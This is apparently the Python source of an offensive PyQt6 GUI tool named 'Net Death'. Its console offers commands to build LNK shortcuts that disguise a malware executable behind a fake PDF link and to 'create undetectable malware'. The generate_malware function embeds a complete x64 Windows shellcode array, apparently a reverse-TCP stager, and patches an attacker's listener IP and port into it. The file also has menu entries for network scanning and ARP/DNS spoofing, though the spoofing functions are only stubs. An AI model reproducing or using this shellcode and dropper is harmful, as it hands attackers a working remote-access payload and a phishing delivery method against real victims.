import json
import subprocess
import sys
import ctypes
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QLabel, QLineEdit, QCheckBox, QTextEdit,
                             QGridLayout, QToolBar, QStatusBar, QTabWidget, QVBoxLayout, QHBoxLayout,
                             QGroupBox, QFrame, QSplitter, QScrollBar, QMessageBox, QInputDialog, QPlainTextEdit)
from PyQt6.QtCore import Qt, QDate, QSize, QFile, QTextStream, QDir
from PyQt6.QtGui import QFont, QAction, QIcon

from src.gui import breeze_resources

from src.net.scan.scan import Scan


class ConsoleTab(QWidget):
    def __init__(self):
        super().__init__()
        self.prompt = "net@death >>"
        self.console_label_input = QLabel(self.prompt)
        self.console_line_input = QLineEdit()
        self.console_text_output = QTextEdit()
        self.console_text_output.setReadOnly(True)
        self.shellcode_edit = QPlainTextEdit()

        self.setUpLayout()

    def getPrompt(self):
        return self.prompt

    def setPrompt(self, prompt):
        self.prompt = prompt

    def getLineText(self):
        return self.console_line_input.text()

    def clearLineText(self):
        self.console_line_input.clear()

    def setOutText(self, outputText):
        self.console_text_output.setText(outputText)

    def setUpLayout(self):
        console_h_input = QHBoxLayout()
        console_h_input.addWidget(self.console_label_input)
        console_h_input.addWidget(self.console_line_input)

        console_widget = QWidget()
        console_widget.setLayout(console_h_input)

        console_grid_tab = QVBoxLayout()
        console_grid_tab.addWidget(self.console_text_output)
        console_grid_tab.addWidget(console_widget)

        self.connectSignals()

        self.setLayout(console_grid_tab)

    def connectSignals(self):
        self.console_line_input.returnPressed.connect(self.executeCommands)

    def setup_shoot_cut(self):
        icon, state1 = QInputDialog.getText(self, "Icon ", "Specify and icon")
        if state1:
            shortcut_name, state2 = QInputDialog.getText(self, "Name ", "Specify the shortcut name")
            if state2:
                fake_pdf_link, state3 = QInputDialog.getText(self, "URL", "Specify the fake pdf link (i.e. "
                                                                          "google doc)")
                if state3:
                    exec_file, state4 = QInputDialog.getText(self, "Executable Name ",
                                                             "Specify the executable file name")

                    if state4:
                        create_mal_shortcut(self, shortcut_name, fake_pdf_link, exec_file)

    def setup_malware_parameter(self):
        LHOST, state_LHOST = QInputDialog.getText(self, "Local Host ", "Specify the local address for the listener")
        if state_LHOST:
            LPORT, state_LPORT = QInputDialog.getText(self, "Local Port ", "Specify the local port for the listener")
            if state_LPORT:
                shellcode_str = ','.join(f'0x{byte:02x}' for byte in generate_malware(self, LHOST, int(LPORT)))
                self.setOutText(shellcode_str)

    def setup_scan(self):
        target, state_target = QInputDialog.getText(self, "Target Network ", "Target Network To Scan")
        if state_target:
            return scan(target)

    def executeCommands(self):
        commands = [
            "help",
            "banner",
            "shortcut",
            "generateMalware",
            "scan",
            "setTargets",
            "setDomains",
            "arper",
            "DNSspoofer",
            "clear",
            "exit"
        ]
        descriptions = [
            "Display Help Menu",
            "I Like Banners",
            "Create LNK file for malware first stage delivery",
            "Create Undetectable Malware (bypass multiple AV)",
            "Scan For Alive Devices",
            "Set Targets IPs",
            "Set Domains To Be Spoofed",
            "Launch Arp Spoof Attack",
            "Launch DNS Spoofer",
            "Are You Serious ?!",
            "Leave Me Here !"
        ]

        listOfCommands = {"Command": "\n".join(commands), "Description": "\n".join(descriptions)}

        print(f"[+] Execute Command {self.getLineText()}")
        if self.getLineText() == "pwd":
            self.setOutText("[+] Print Working Directory")
        elif self.getLineText() == "help":
            self.setOutText("[+] Help\n" + listOfCommands["Command"])
        elif self.getLineText() == "whoami":
            self.setOutText("[+] NetDeath V0.1\n")
        elif self.getLineText() == "clear":
            self.setOutText("")
        elif "scan" in self.getLineText():
            scan_result = self.setup_scan()
            self.clearLineText()
            tree_text = print_table(scan_result)
            self.setOutText(tree_text)

        elif self.getLineText() == "shortcut":
            self.setup_shoot_cut()
        elif self.getLineText() == "generateMalware":
            self.setup_malware_parameter()

        self.clearLineText()


class MainWindow(QMainWindow):
    def __init__(self):
        """ Constructor For Net Death MainWindow """
        super().__init__()
        # The Tab Bar Widget Object
        self.tab_bar = QTabWidget(parent=self)
        self.console_tab = ConsoleTab()
        self.initializeUI()

    def initializeUI(self):
        """ Set Up The Application """
        self.setMinimumSize(500, 300)
        self.setWindowTitle("Net Death v1.0")
        self.setWindowIcon(QIcon("images/the-reaper.png"))
        self.setUpMainWindow()
        self.createActions()
        self.createMenu()
        self.statusBar().showMessage("[+] Welcome To Net Death V1.0")
        self.show()  # Display the window to the screen

    def setUpMainTab(self):
        self.tab_bar.setTabsClosable(True)
        self.tab_bar.setMovable(True)
        self.tab_bar.tabCloseRequested.connect(self.closeTab)

        self.tab_bar.addTab(self.console_tab, "Console")

    def setUpMainWindow(self):
        """ Create And Arrange Widgets In The Main Window
        Set Up Tab Bar And Different Tab Widgets. """

        # Create tab bar and different page containers
        self.setUpMainTab()

        # self.console_tab = QWidget()
        # self.dns_spoof_tab = QWidget()

        # self.tab_bar.addTab(self.console_tab, "Console")
        # self.tab_bar.addTab(self.dns_spoof_tab, "DNS Spoof")

        # Call methods to create the pages
        # self.ConsoleTab()
        # self.DNSSpoofTab()

        # Dummy Tab
        self.dummy_tab = QTabWidget()
        self.dummy_tab.setMovable(True)

        self.graph_tab = QWidget()
        self.config_tab = QWidget()

        self.dummy_tab.addTab(self.graph_tab, "Graph View")
        self.dummy_tab.addTab(self.config_tab, "Configuration")

        # Splitter
        splitter = QSplitter(Qt.Orientation.Vertical)
        splitter.addWidget(self.dummy_tab)
        splitter.addWidget(self.tab_bar)

        # Create Layout For Main Window
        self.main_v = QVBoxLayout()
        # self.main_v.addWidget(self.dummy_frame)
        # self.setCentralWidget(self.dummy_frame)
        # self.main_v.addWidget(tab_bar)
        # self.setCentralWidget(tab_bar)
        self.main_v.addWidget(splitter)
        self.setCentralWidget(splitter)
        self.setLayout(self.main_v)

        # Create Status Bar
        self.setStatusBar(QStatusBar())

    # def ConsoleTab(self):
    #     console_label_input = QLabel("net@death >")
    #     self.console_line_input = QLineEdit()
    #     self.console_line_input.returnPressed.connect(self.executeCommands)
    #
    #     console_h_input = QHBoxLayout()
    #     console_h_input.addWidget(console_label_input)
    #     console_h_input.addWidget(self.console_line_input)
    #
    #     self.console_text_output = QTextEdit()
    #     self.console_text_output.setReadOnly(True)
    #
    #     console_widget = QGroupBox()
    #     console_widget.setLayout(console_h_input)
    #
    #     console_grid_tab = QGridLayout()
    #     console_grid_tab.addWidget(self.console_text_output)
    #     # console_grid_tab.addStretch()
    #     console_grid_tab.addWidget(console_widget)
    #
    #     self.console_tabs[-1].setLayout(console_grid_tab)

    def DNSSpoofTab(self):
        pass

    def createActions(self):
        """ Create the application's menu actions """
        # create actions for File menu
        self.quit_act = QAction("&Quit")
        self.quit_act.setShortcut("Ctrl+Q")
        self.quit_act.triggered.connect(self.close)
        self.quit_act.setStatusTip("Don't Leave Me Alone")

        # view actions
        self.open_console = QAction("&Console")
        self.open_console.triggered.connect(self.openConsole)
        self.open_console.setStatusTip("Open Console")

        self.scan = QAction("&Scan")
        self.scan.setShortcut("Ctrl+S")
        self.scan.triggered.connect(scan)
        self.scan.setStatusTip("Scan The Network")

        self.about = QAction("&About")
        self.about.triggered.connect(about)

        self.dnsSpoof = QAction("&DnsSpoof")
        self.dnsSpoof.triggered.connect(dnsSpoof)
        self.dnsSpoof.setStatusTip("Start DNS Spoof Attack")

        self.arpSpoof = QAction("&ArpSpoof")
        self.arpSpoof.triggered.connect(arpSpoof)
        self.arpSpoof.setStatusTip("Start ARP Spoof Attack")

    def createMenu(self):
        """ Create the application's menu bar. """
        self.menuBar().setNativeMenuBar(False)

        # create File menu and actions
        file_menu = self.menuBar().addMenu("Options")
        file_menu.addAction(self.quit_act)
        file_menu.addSeparator()

        # View Menu
        view_menu = self.menuBar().addMenu("View")
        view_menu.addAction(self.open_console)
        view_menu.addSeparator()

        # Discovery Tools
        discover_menu = self.menuBar().addMenu("Discover")
        discover_menu.addAction(self.scan)

        # Attacks Menu
        attack_menu = self.menuBar().addMenu("Attacks")
        attack_menu.addAction(self.dnsSpoof)
        attack_menu.addSeparator()
        attack_menu.addAction(self.arpSpoof)

    def openConsole(self):
        self.tab_bar.addTab(ConsoleTab(), "Console")
        print("[+] Open Console")

    def closeTab(self, index):
        print("[+] Remove Tab")
        self.tab_bar.removeTab(index)


def print_table(data):
    header = ["IP Address", "Port Number", "Protocol", "Service", "Status"]
    rows = []

    for ip, details in data.items():
        if 'ports' in details:
            for port in details['ports']:
                if port['state'] == 'open':
                    row = [
                        ip,
                        port['portid'],
                        port['protocol'],
                        port['service']['name'],
                        port['state']
                    ]
                    rows.append(row)

    table_str = " | ".join(header) + "\n"
    table_str += "-" * (len(table_str) - 1) + "\n"

    for row in rows:
        table_str += " | ".join(row) + "\n"

    return table_str


def scan(target):
    # Define The Scanner
    print("[+] Scanning Started")
    scanner = Scan(target=target)
    return scanner.scan_top_ports()


def create_mal_shortcut(self, shortcut_name, doc_url, exec_name):
    # Your custom function based on the parameters
    command = [
        "python",
        "shortcut.py",
        "--icon",
        "edge",
        "--name",
        shortcut_name,
        "-fp",
        doc_url,
        exec_name,
    ]

    try:
        subprocess.run(command, check=True)
        QMessageBox.information(self, "Success", f"Your parameters: {shortcut_name}, {doc_url}, {exec_name}")
    except subprocess.CalledProcessError as e:
        QMessageBox.critical(self, "Error", f"Error running command: {e}")


def update_shellcode_ip_port(shellcode, ip, port):
    # Offsets for the IP address and port in the shellcode
    ip_offset = 183
    port_offset = 186

    # Convert the IP address and port to bytes
    ip_bytes = bytes(map(int, ip.split('.')))
    port_bytes = port.to_bytes(2, byteorder='big')

    # Update the shellcode with the new IP address and port
    shellcode[ip_offset:ip_offset + 4] = ip_bytes
    shellcode[port_offset:port_offset + 2] = port_bytes


def generate_malware(self, LHOST, LPORT):
    shellcode = bytearray([
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8,
        0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48,
        0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a,
        0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,
        0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41,
        0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66,
        0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b,
        0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x44, 0x8b, 0x40, 0x20, 0x8b, 0x48, 0x18, 0x49, 0x01, 0xd0,
        0xe3, 0x56, 0x4d, 0x31, 0xc9, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88,
        0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45,
        0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0,
        0x41, 0x8b, 0x04, 0x88, 0x41, 0x58, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x5e,
        0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
        0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
        0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33,
        0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0,
        0x01, 0x00, 0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x01, 0xbb,
        0x36, 0xa3, 0xd7, 0xd3, 0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1,
        0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68,
        0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff,
        0xd5, 0x6a, 0x0a, 0x41, 0x5e, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31,
        0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89,
        0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7,
        0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba,
        0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0a, 0x49, 0xff,
        0xce, 0x75, 0xe5, 0xe8, 0x93, 0x00, 0x00, 0x00, 0x48, 0x83, 0xec, 0x10,
        0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9, 0x6a, 0x04, 0x41, 0x58, 0x48, 0x89,
        0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00,
        0x7e, 0x55, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41,
        0x59, 0x68, 0x00, 0x10, 0x00, 0x00, 0x41, 0x58, 0x48, 0x89, 0xf2, 0x48,
        0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89,
        0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31, 0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89,
        0xda, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5,
        0x83, 0xf8, 0x00, 0x7d, 0x28, 0x58, 0x41, 0x57, 0x59, 0x68, 0x00, 0x40,
        0x00, 0x00, 0x41, 0x58, 0x6a, 0x00, 0x5a, 0x41, 0xba, 0x0b, 0x2f, 0x0f,
        0x30, 0xff, 0xd5, 0x57, 0x59, 0x41, 0xba, 0x75, 0x6e, 0x4d, 0x61, 0xff,
        0xd5, 0x49, 0xff, 0xce, 0xe9, 0x3c, 0xff, 0xff, 0xff, 0x48, 0x01, 0xc3,
        0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6, 0x75, 0xb4, 0x41, 0xff, 0xe7, 0x58,
        0x6a, 0x00, 0x59, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0x89, 0xda, 0xff,
        0xd5
    ])
    update_shellcode_ip_port(shellcode, LHOST, LPORT)
    print(f"Shellcode updated: {LHOST}:{LPORT}")
    return shellcode


def attack():
    print("[+] Attack")


def dnsSpoof():
    print("[+] Start DNS Spoofing")


def arpSpoof():
    print("[+] Start Arp Spoofing")


def about():
    print("[?] About Us")


# Run the program
if __name__ == '__main__':
    app = QApplication(sys.argv)
    file = QFile(":/dark/stylesheet.qss")
    file.open(QFile.OpenModeFlag.ReadOnly | QFile.OpenModeFlag.Text)
    stream = QTextStream(file)
    app.setStyleSheet(stream.readAll())
    # app.setStyleSheet(open("style/main-style-dark-1.stylesheet").read())
    # app.setStyleSheet(open("style/main-style-3").read())
    # Setup TaskBar Icon
    appID = 'netdeath'  # arbitrary string
    ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(appID)
    app.setWindowIcon(QIcon("images/the-reaper.png"))

    window = MainWindow()
    sys.exit(app.exec())
